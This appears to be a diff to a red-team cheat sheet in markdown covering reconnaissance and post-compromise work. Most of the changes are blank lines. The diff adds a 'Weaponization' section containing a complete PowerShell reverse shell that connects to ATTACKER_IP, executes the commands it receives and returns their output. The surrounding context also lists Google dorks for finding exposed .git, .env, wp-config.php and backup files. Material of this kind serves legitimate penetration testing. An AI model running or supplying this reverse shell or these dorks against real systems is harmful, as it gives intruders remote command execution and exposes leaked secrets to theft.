@@ -6,8 +6,6 @@
 4. [Network Security Evasions](#networksecurityevasions)
 5. [Compromising Active Directories](#compromisingad)
 
-
-
 # I. Initial Access <a name="initialaccess"></a>
 
 ## Recon
@@ -35,6 +33,7 @@ related:example.com
 allinurl:login admin
 allintitle:admin login
 ```
+
 Common Google Dorks for Red Teamers
 ```
 inurl:admin | inurl:login | inurl:dashboard
@@ -48,6 +47,7 @@ filetype:bak OR filetype:backup OR filetype:old OR filetype:zip
 intitle:index.of "parent directory" site:example.com
 inurl:ftp://
 ```
+
 Advanced Dorks for More Targeted Recon
 ```
 inurl:.git OR inurl:.git/config
@@ -55,6 +55,7 @@ intext:"@example.com" filetype:xls OR filetype:doc
 inurl:.env OR inurl:wp-config.php
 inurl:"ViewerFrame?Mode=" OR inurl:"axis-cgi"
 ```
+
 Combining Dorks for Better Results
 ```
 site:example.com filetype:log
@@ -81,6 +82,23 @@ keys add KEY_NAME KEY_VALUE
 keys remove KEY_NAME
 run
 ```
+
+## Weaponization
+
+Powershell Reverse Shell
+```
+$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+$sendback = (iex $data 2>&1 | Out-String );
+$sendback2  = $sendback + "PS " + (pwd).Path + "> ";
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+$stream.Write($sendbyte,0,$sendbyte.Length);
+$stream.Flush()};
+$client.Close()
+```
+
 
 # II. Post Compromise <a name="postcompromise"></a>
 
